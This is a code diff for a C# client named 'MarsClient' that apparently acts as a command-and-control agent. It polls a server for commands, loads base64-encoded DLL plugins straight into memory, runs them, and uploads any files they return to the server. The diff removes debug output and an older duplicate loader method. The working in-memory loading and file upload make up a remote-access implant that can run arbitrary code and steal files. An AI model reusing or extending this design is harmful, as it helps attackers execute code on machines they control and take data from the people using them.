@@ -115,9 +115,6 @@ namespace MarsClient
 
         public async Task SendFileToServer(string filepath, string filename)
         {
-            Console.WriteLine("sending?");
-            // echo filepath
-            Console.WriteLine(filepath);
             // file to base64
             byte[] bytes = File.ReadAllBytes(filepath);
             string file = Convert.ToBase64String(bytes);
@@ -134,7 +131,7 @@ namespace MarsClient
             (bool l, string a) = await BuildAndSendHTTPRequest(new StringContent(responseBody));
 
             if(l){
-                Console.WriteLine(a);
+                //Console.WriteLine(a);
             }else{
                 Console.WriteLine("failed to send file");
             }
@@ -179,14 +176,11 @@ namespace MarsClient
                         try{
                             string[] pars = JsonSerializer.Deserialize<string[]>(command[3]);
                             if (pars != null && (pars.Length >= 1 && pars[0] != "")){
-                                Console.WriteLine("hi the if else didnt worked");
                                 result = RunPluginCommandFromBase64(file, command[2].ToString(), pars);
                             } else {
-                                Console.WriteLine("hi the if else worked");
                                 result = RunPluginCommandFromBase64(file, command[2].ToString(), null);
                             }
                         } catch (Exception e) {
-                            Console.WriteLine("hi");
                             Console.WriteLine(e);
                             Console.WriteLine();
                             result = RunPluginCommandFromBase64(file, null, null);
@@ -201,45 +195,6 @@ namespace MarsClient
                 Console.WriteLine("Communicator> Agent failed to fetch commands.");
             }
             
-        }
-
-        private string PluginCommand(string command, string[]? plugParam){
-            //saves a file transfered from the server
-            //should take real commands to run with real plugins
-            //that are loaded with assembly from a dll
-            Assembly asm = Assembly.Load(Base64DecodeFile(command));
-            /*
-            * this should search through all classes to find the Main or other starting method
-            */
-            foreach(Type oType in asm.GetTypes()){
-                try{
-                    dynamic c = Activator.CreateInstance(oType);
-                    var methods = oType.GetMethods();
-                    var method = oType.GetMethod("PluginMain");
-                    IDictionary<string, dynamic> dll_return = method.Invoke(c, plugParam);
-
-                    if(dll_return["ExitCode"] == 0){
-                        // send files API
-                        if (dll_return.TryGetValue("Files", out dynamic files)) {
-                            Console.WriteLine("Communicator> Sending files");
-                            for (int i = 0; i < files.Length; i++) 
-                            {
-                                this.SendFileToServer(files[i], Path.GetFileName(files[i]));
-                            }
-                        }
-                        string exit_message = dll_return["ExitMessage"];
-                        return $"Plugin ran successfully: {exit_message}";
-                    }else{
-                        string exit_message = dll_return["ExitMessage"];
-                        return $"Plugin failed to run: {exit_message}";
-                    }
-                } catch (Exception e){
-                    continue;
-                }
-            }
-            return "Failed to run plugin!";
-            //File.WriteAllBytes("./file", Base64DecodeFile(command));
-            //return "did it";
         }
 
         private string RunPluginCommandFromBase64(string binary, string command, string[]? plugParam){
@@ -258,10 +213,12 @@ namespace MarsClient
             if(dll_return["ExitCode"] == 0){
                 // send files API
                 if (dll_return.TryGetValue("Files", out dynamic files)) {
-                    Console.WriteLine("Sending files");
+                    Console.WriteLine("MarsClient> Sending files");
                     for (int i = 0; i < files.Length; i++) 
                     {
-                        this.SendFileToServer(files[i], Path.GetFileName(files[i]));
+                        string filename = Path.GetFileName(files[i]);
+                        this.SendFileToServer(files[i], filename);
+                        Console.WriteLine($"MarsClient> Sent '{filename}' to server.");
                     }
                 }
                 Console.WriteLine($"MarsClient> Notifying server of successful plugin run: {_plugin.Name}");
